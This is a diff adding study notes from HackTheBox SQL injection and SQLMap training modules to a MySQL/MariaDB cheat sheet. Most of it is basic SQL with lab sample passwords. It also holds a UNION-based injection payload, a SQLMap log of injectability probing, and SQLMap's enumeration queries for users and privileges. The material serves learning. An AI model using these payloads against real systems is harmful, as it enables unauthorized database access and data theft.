+mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+
++--------------------+
+| SCHEMA_NAME        |
++--------------------+
+| mysql              |
+| information_schema |
+| performance_schema |
+| ilfreight          |
+| dev                |
++--------------------+
+6 rows in set (0.01 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — SCHEMATA](/web/htb/sql-injection-fundamentals#schemata)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="SELECT Statement">
+
+### SELECT Statement
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM logins;
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
++----+---------------+------------+---------------------+
+4 rows in set (0.00 sec)
+
+
+mysql> SELECT username,password FROM logins;
+
++---------------+------------+
+| username      | password   |
++---------------+------------+
+| admin         | p@ssw0rd   |
+| administrator | adm1n_p@ss |
+| john          | john123!   |
+| tom           | tom123!    |
++---------------+------------+
+4 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — SELECT Statement](/web/htb/sql-injection-fundamentals#select-statement)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Sorting Results">
+
+### Sorting Results
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM logins ORDER BY password;
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
+|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
++----+---------------+------------+---------------------+
+4 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Sorting Results](/web/htb/sql-injection-fundamentals#sorting-results)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM logins ORDER BY password DESC;
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
+|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
++----+---------------+------------+---------------------+
+4 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Sorting Results](/web/htb/sql-injection-fundamentals#sorting-results)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM logins ORDER BY password DESC, id ASC;
+
++----+---------------+-----------------+---------------------+
+| id | username      | password        | date_of_joining     |
++----+---------------+-----------------+---------------------+
+|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |
+|  2 | administrator | change_password | 2020-07-02 11:30:50 |
+|  3 | john          | change_password | 2020-07-02 11:47:16 |
+|  4 | tom           | change_password | 2020-07-02 11:50:20 |
++----+---------------+-----------------+---------------------+
+4 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Sorting Results](/web/htb/sql-injection-fundamentals#sorting-results)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Symbol Operators">
+
+### Symbol Operators
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT 1 = 1 && 'test' = 'abc';
+
++-------------------------+
+| 1 = 1 && 'test' = 'abc' |
++-------------------------+
+|                       0 |
++-------------------------+
+1 row in set, 1 warning (0.00 sec)
+
+mysql> SELECT 1 = 1 || 'test' = 'abc';
+
++-------------------------+
+| 1 = 1 || 'test' = 'abc' |
++-------------------------+
+|                       1 |
++-------------------------+
+1 row in set, 1 warning (0.00 sec)
+
+mysql> SELECT 1 != 1;
+
++--------+
+| 1 != 1 |
++--------+
+|      0 |
++--------+
+1 row in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Symbol Operators](/web/htb/sql-injection-fundamentals#symbol-operators)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Tables">
+
+### Tables
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> CREATE TABLE logins (
+    ->     id INT,
+    ->     username VARCHAR(100),
+    ->     password VARCHAR(100),
+    ->     date_of_joining DATETIME
+    ->     );
+Query OK, 0 rows affected (0.03 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Tables](/web/htb/sql-injection-fundamentals#tables)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SHOW TABLES;
+
++-----------------+
+| Tables_in_users |
++-----------------+
+| logins          |
++-----------------+
+1 row in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Tables](/web/htb/sql-injection-fundamentals#tables)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> DESCRIBE logins;
+
++-----------------+--------------+
+| Field           | Type         |
++-----------------+--------------+
+| id              | int          |
+| username        | varchar(100) |
+| password        | varchar(100) |
+| date_of_joining | date         |
++-----------------+--------------+
+4 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Tables](/web/htb/sql-injection-fundamentals#tables)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="UPDATE Statement">
+
+### UPDATE Statement
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;
+
+Query OK, 3 rows affected (0.00 sec)
+Rows matched: 3  Changed: 3  Warnings: 0
+
+
+mysql> SELECT * FROM logins;
+
++----+---------------+-----------------+---------------------+
+| id | username      | password        | date_of_joining     |
++----+---------------+-----------------+---------------------+
+|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |
+|  2 | administrator | change_password | 2020-07-02 11:30:50 |
+|  3 | john          | change_password | 2020-07-02 11:47:16 |
+|  4 | tom           | change_password | 2020-07-02 11:47:16 |
++----+---------------+-----------------+---------------------+
+4 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — UPDATE Statement](/web/htb/sql-injection-fundamentals#update-statement)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Un-even Columns">
+
+### Un-even Columns
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
+
++-----------+-----------+-----------+-----------+
+| product_1 | product_2 | product_3 | product_4 |
++-----------+-----------+-----------+-----------+
+|   admin   |    2      |    3      |    4      |
++-----------+-----------+-----------+-----------+
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Un-even Columns](/web/htb/sql-injection-fundamentals#un-even-columns)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Union">
+
+### Union
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM ports;
+
++----------+-----------+
+| code     | city      |
++----------+-----------+
+| CN SHA   | Shanghai  |
+| SG SIN   | Singapore |
+| ZZ-21    | Shenzhen  |
++----------+-----------+
+3 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Union](/web/htb/sql-injection-fundamentals#union)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM ships;
+
++----------+-----------+
+| Ship     | city      |
++----------+-----------+
+| Morrison | New York  |
++----------+-----------+
+1 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Union](/web/htb/sql-injection-fundamentals#union)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM ports UNION SELECT * FROM ships;
+
++----------+-----------+
+| code     | city      |
++----------+-----------+
+| CN SHA   | Shanghai  |
+| SG SIN   | Singapore |
+| Morrison | New York  |
+| ZZ-21    | Shenzhen  |
++----------+-----------+
+4 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — Union](/web/htb/sql-injection-fundamentals#union)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="User Privileges">
+
+### User Privileges
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+MariaDB [(none)]> CREATE USER 'reader'@'localhost';
+
+Query OK, 0 rows affected (0.002 sec)
+
+
+MariaDB [(none)]> GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
+
+Query OK, 0 rows affected (0.000 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — User Privileges](/web/htb/sql-injection-fundamentals#user-privileges-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+grcic550@htb[/htb]$ mysql -u reader -p
+
+MariaDB [(none)]> use ilfreight;
+MariaDB [ilfreight]> SHOW TABLES;
+
++---------------------+
+| Tables_in_ilfreight |
++---------------------+
+| ports               |
++---------------------+
+1 row in set (0.000 sec)
+
+
+MariaDB [ilfreight]> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+
++--------------------+
+| SCHEMA_NAME        |
++--------------------+
+| information_schema |
+| ilfreight          |
++--------------------+
+2 rows in set (0.000 sec)
+
+
+MariaDB [ilfreight]> SELECT * FROM ilfreight.credentials;
+ERROR 1142 (42000): SELECT command denied to user 'reader'@'localhost' for table 'credentials'
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — User Privileges](/web/htb/sql-injection-fundamentals#user-privileges-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="WHERE Clause">
+
+### WHERE Clause
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM logins WHERE id > 1;
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
++----+---------------+------------+---------------------+
+3 rows in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — WHERE Clause](/web/htb/sql-injection-fundamentals#where-clause)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+**SQL Injection Fundamentals — HTB Module**
+
+```text
+mysql> SELECT * FROM logins where username = 'admin';
+
++----+----------+----------+---------------------+
+| id | username | password | date_of_joining     |
++----+----------+----------+---------------------+
+|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
++----+----------+----------+---------------------+
+1 row in set (0.00 sec)
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQL Injection Fundamentals — HTB Module — WHERE Clause](/web/htb/sql-injection-fundamentals#where-clause)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Display Errors">
+
+### Display Errors
+
+**SQLMap Essentials — HTB Module**
+
+```text
+...SNIP...
+[16:09:20] [INFO] testing if GET parameter 'id' is dynamic
+[16:09:20] [INFO] GET parameter 'id' appears to be dynamic
+[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '))"',),)((' at line 1'"
+[16:09:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''YzDZJELylInm' at line 1'
+...SNIP...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — Display Errors](/web/htb/sqlmap-essentials#display-errors)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="SQLMap Data Exfiltration">
+
+### SQLMap Data Exfiltration
+
+**SQLMap Essentials — HTB Module**
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+
+<root>
+    <dbms value="MySQL">
+        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
+        <cast query="CAST(%s AS NCHAR)"/>
+        <length query="CHAR_LENGTH(%s)"/>
+        <isnull query="IFNULL(%s,' ')"/>
+...SNIP...
+        <banner query="VERSION()"/>
+        <current_user query="CURRENT_USER()"/>
+        <current_db query="DATABASE()"/>
+        <hostname query="@@HOSTNAME"/>
+        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
+        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
+        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
+        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
+        <users>
+            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
+            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
+        </users>
+    ...SNIP...
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [SQLMap Essentials — HTB Module — SQLMap Data Exfiltration](/web/htb/sqlmap-essentials#sqlmap-data-exfiltration)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -843,6 +1767,10 @@ mysql -u <user> -p<pass> -h <IP>
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://dev.mysql.com/doc/refman/8.4/en/mysql.html)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -850,5 +1778,3 @@ mysql -u <user> -p<pass> -h <IP>
 - [MySQL and MariaDB Enumeration](/enumeration/mysql-mariadb-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
